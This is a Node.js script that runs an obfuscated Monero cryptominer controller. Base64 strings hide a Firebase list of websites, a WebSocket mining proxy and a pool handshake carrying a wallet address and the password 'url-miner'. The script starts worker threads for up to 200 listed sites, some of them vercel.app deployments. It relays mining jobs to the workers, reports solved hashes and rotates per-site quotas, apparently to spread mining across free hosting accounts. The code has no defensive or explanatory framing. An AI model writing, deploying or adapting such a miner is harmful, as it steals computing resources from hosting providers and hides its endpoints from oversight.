const { Worker, workerData } = require('node:worker_threads')
const WebSocketClient = require('websocket').client
const axios = require('axios')

let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')

let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')

let SIZE = 10

let mClient = null
let mJob = null
let mAccepted = 0
let mPrevAcpt = 0
let mWorker = {}
let mTimeout = null

const mQuota = getQuota()

startServer()

async function startServer() {
    try {
        let response = await axios.get(BASE_URL+'website.json?orderBy="quota"&&startAt=0&endAt='+parseInt(new Date().getTime()/1000)+'&print=pretty')
        await waitForJob()

        let list = []
        let limit = 0
        for (let key of Object.keys(response.data)) {
            limit++
            if (limit <= 200) {
                list.push(key)

                if (list.length >= SIZE) {
                    try {
                        let worker = await addWorker(key, list, mJob)
                        worker.on('message', onMessage)
                        mWorker[key] = worker
                    } catch (error) {}
                }  
            }
        }

        console.log('Worker Size: ', Object.keys(response.data).length)
    } catch (error) {
        console.log('Start Server Error')

        await delay(3000)
        await startServer()
    }
}

async function waitForJob() {
    while (true) {
        await delay(1000)
        if (mJob != null) {
            break
        }
    }
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

const addWorker = async (key, list, job) => {
    return new Promise((resolve, reject) => {
        let worker = new Worker('./worker.js', { workerData: { id:key, list:list, job:job } })
        resolve(worker)
    })
}

const onMessage = function(solved) {
    if (solved['status'] == 'SOLVED') {
        mAccepted++
        if (mClient) {
            mClient.send(JSON.stringify(solved['job']))
        }
    } else if (solved['status'] == 'CLOSE') {
        try {
            if(solved['key']) {
                if (solved['id'] != null && mWorker[solved['id']]) {
                    try {
                        mWorker[solved['id']].terminate()
                    } catch (error) {}
                    delete mWorker[solved['id']]
                }
                updateUrl(solved['key'])
            }
        } catch (error) {}
    }
}

async function updateUrl(key) {
    try {
        let quota = parseInt(new Date().getTime()/1000)+86400
        if (key.endsWith('vercel.app') || key.endsWith('vercel_app')) {
            quota = mQuota
        }
        await axios.patch(BASE_URL+'website/'+key+'.json', JSON.stringify({ quota:quota }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

connneckClient()

function connneckClient() {
    let client = new WebSocketClient()

    client.on('connectFailed', function(error) {
        mClient = null
        console.log('Re-Connect', 'Failed')
        if (mTimeout) clearTimeout(mTimeout)
        setTimeout(() => connneckClient(), 2000)
    })
    
    client.on('connect', function(conn) {
    
        mClient = conn
    
        console.log('WebSocket Client Connected')
    
        mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI0NVFXQVJpV2lWeDlmdTVMeWJmTjJIVm03Y3JXeHZlZXBoOGd6ZFZkUmtkd0NmMmo5QmhMVFYyUk41TkY0djdLMmRLRVlhRkNhVXcxMTdMbXcxWmVZOXA5RnI2aXdzbiIsInBhc3N3b3JkIjoidXJsLW1pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
    
        mClient.on('error', function(error) {
            mClient = null
            console.log('Re-Connect', 'Error')
            if (mTimeout) clearTimeout(mTimeout)
            setTimeout(() => connneckClient(), 2000)
        })
    
        mClient.on('message', function(message) {
            try {
                let data = JSON.parse(message.utf8Data)
                if(data['identifier'] == 'job') {
                    mJob = data
                    
                    console.log('New Job Received...')
                    sendJob()
                }
            } catch (e) {}
        })
    })
    
    client.connect(WSS)

    mTimeout = setTimeout(() => {
        try {
            mClient.close()
        } catch (error) {}
        try {
            client.close()
        } catch (error) {}
        try {
            mClient = null
            client = null
        } catch (error) {}
        
        console.log('Re-Connect')
        connneckClient()
    }, 600000)
}

function sendJob() {
    for(let worker of Object.values(mWorker)) {
        try {
            worker.postMessage(mJob)
        } catch (error) {}
    }
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}

function getQuota() {
    let year = new Date().getFullYear()
    let month = new Date().getMonth()+2

    if (month > 12) {
        month = 1
        year++
    }

    return parseInt(new Date(month+'/1/'+year).getTime()/1000)
}

setInterval(function() {
    if(mJob) {
        if (mAccepted != mPrevAcpt) {
            console.log('Hash Accepted: ', mAccepted)
            mPrevAcpt = mAccepted
        }
    }
}, 5000)
